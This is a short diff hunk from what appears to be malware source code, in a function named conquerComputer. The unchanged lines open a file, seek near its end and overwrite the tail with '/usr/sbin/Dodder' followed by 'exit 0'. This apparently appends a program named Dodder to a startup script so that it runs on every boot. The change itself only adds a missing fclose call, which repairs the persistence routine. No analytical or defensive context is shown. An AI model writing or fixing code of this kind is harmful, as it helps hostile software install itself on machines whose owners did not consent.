@@ -159,5 +159,6 @@ void conquerComputer(const char *path)
     fseek(p, -7, SEEK_END);
     fputs("/usr/sbin/Dodder\nexit 0", p);
     std::cout << "OK" << std::endl;
+    fclose(p);
 }
 
